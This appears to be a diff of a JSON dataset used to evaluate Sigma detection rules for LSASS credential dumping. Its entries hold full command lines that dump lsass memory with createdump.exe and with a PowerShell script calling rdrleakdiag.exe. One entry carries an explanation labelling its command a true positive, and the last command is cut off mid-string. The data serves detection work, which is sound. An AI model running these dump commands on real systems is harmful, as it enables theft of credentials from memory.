@@ -1,4 +1,3 @@
-```json
 [
   {
     "output": "\"C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe\" -u -f C:\\Users\\thaim\\AppData\\Local\\Temp\\dotnet-lsass.dmp 788",
@@ -21,4 +20,6 @@
     "explanation": "The command includes 'lsass' and '.dmp' in the filename, which matches the Sigma rule. This is a true positive."
   },
   {
-    "output": "\"powershell.exe\" & {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") { $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\" } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") { $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\" } else { $binary_path = \"File not found\" exit 1 } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 & $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \"Minidump file, minidump_$
+    "output": "\"powershell.exe\" & {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") { $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\" } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") { $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\" } else { $binary_path = \"File not found\" exit 1 } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 & $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \"Minidump file, minidump_$"
+  }
+]
